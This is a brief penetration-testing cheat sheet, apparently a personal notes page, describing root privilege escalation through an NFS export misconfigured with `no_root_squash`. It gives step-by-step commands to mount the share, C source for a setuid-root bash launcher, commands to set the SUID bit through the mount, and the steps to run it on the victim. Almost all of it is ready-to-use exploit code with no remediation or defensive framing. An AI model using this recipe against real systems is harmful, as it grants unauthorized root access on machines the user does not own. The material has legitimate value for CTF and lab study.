# Misconfig

If you see a location with `no_root_squash`, you hit the jackpot

```sh
cat /etc/exports
```

> `no_root_squash` allows remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. So we can create a payload with `SUID` bit set

## Mount the vulnerable location

```sh
mkdir nfs
sudo mount -t nfs $target:/misconfig/location ./nfs
```

## Create exploit

Compile the exploit, name it `shell`

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Then move it to the nfs mount point, and set the `setuid` bit

```sh
gcc shell.c -o shell
mv shell ./nfs
chmod +s ./nfs/shell
```

## Exploit

On victim machine, navigate to the misconfigured location, executes the payload

```sh
cd /misconfig/location
./shell
```